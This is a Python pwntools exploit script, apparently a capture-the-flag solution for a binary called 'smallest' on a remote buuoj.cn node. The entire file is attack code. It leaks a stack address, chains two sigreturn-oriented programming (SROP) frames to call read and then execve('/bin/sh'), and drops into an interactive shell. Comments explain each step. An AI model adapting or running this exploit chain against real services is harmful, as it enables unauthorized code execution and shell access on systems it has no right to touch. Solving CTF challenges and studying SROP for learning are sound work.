from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

#p = process('./smallest')
p = remote('node4.buuoj.cn', 26844)

start = 0x4000b0
syscall_ret = 0x4000be
start2 = 0x4000b3

payload = p64(start) * 3

p.send(payload)

p.send(b'\xb3')

#leak stack
#p.recv(8)
stack = u64(p.recv()[0x148:0x148+8])

print('[+] stack -> {}'.format(hex(stack)))

#write sigframe to stack & control current rsp to leaked stack
sigframe = SigreturnFrame(kernel = 'amd64')
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack
sigframe.rdx = 0x400
sigframe.rip = syscall_ret
sigframe.rsp = stack

payload = p64(start) + b'a' * 0x8 + bytes(sigframe)

#gdb.attach(p, 'b *0x4000c0')
p.send(payload)
sleep(0.5)

#now, we retn to start and rsp -> aaaaaaaa
#we should call 15, so we send 15 bytes
payload = p64(syscall_ret) + b'a' * 0x7
p.send(payload)
#ok, now, rax = 15, it will call sigreturn, and set sigreturnframe to regs
#after call sigreturn, rsp = stack, rip = syscall_ret, rax = 0, rdi = 0, rsi = stack, rdx = 0x400
#it will call sys_read, but now, we have the rsp

sigframe = SigreturnFrame(kernel = 'amd64')
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack + 0x200
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_ret
sigframe.rsp = stack

#let's write sigframe to stack
payload = p64(start) + b'a' * 0x8 + bytes(sigframe)
payload = payload + b'a' * ( 0x200 - len(payload) ) + b'/bin/sh\0'
p.send(payload)
sleep(0.5)
#great, we should call sigreturn again to adjust rdi and rax
payload = p64(syscall_ret) + b'a' * 0x7
p.send(payload)

p.interactive()

